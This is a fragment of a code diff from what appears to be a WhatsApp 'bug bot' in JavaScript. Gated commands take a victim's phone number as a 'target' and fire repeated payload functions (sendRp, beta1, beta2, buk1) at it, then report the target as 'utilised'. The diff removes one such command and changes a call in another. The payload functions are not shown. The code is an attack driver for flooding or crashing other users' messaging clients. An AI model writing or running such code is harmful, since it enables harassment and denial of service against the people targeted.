@@ -74,7 +74,6 @@ Header
 
 //=================================================//
 const axios = require("axios")
-const puppeteer = require('puppeteer');
 const os = require("os").cpus().length
 const util = require("util")
 const jimp = require("jimp")
@@ -546,32 +545,7 @@ if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(`Wait Your Target is being Utilised`)
 for (let i = 0; i < 2; i++) {
-await sendRp(target, fake)
-await sendRp(target, fake)
-await beta2(sam, target, fake)
-await sendP(target, fake)
-await beta1(sam, target, fake)
-}
-reply(`⫹𝐒𝐏𝐈𝐃𝐄𝐑 𝐔𝐓𝐈𝐋𝐈𝐒𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐅𝐔𝐋⫺
-
-𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
-𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
-𝐔𝐒𝐈𝐍𝐆 : ${command}
-
-    𝐍𝐎𝐓𝐄
-> *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
-> *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*`)
-}
-break
-
-case 'invis': {
-if (!isCreator) return reply(mess.owner)
-if (!isPremium) return reply(mess.prem)
-if (!q) return reply(`Example: ${prefix + command} 2547×××`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-reply(`Wait Your Target is being Utilised`)
-for (let i = 0; i < 2; i++) {
-await buk1(sam, target, 1020000, ptcp = true);
+await buk1(sam, target, "s" ,1020000, ptcp = true);
 await sendRp(target, fake)
 await sendRp(target, fake)
 await beta2(sam, target, fake)
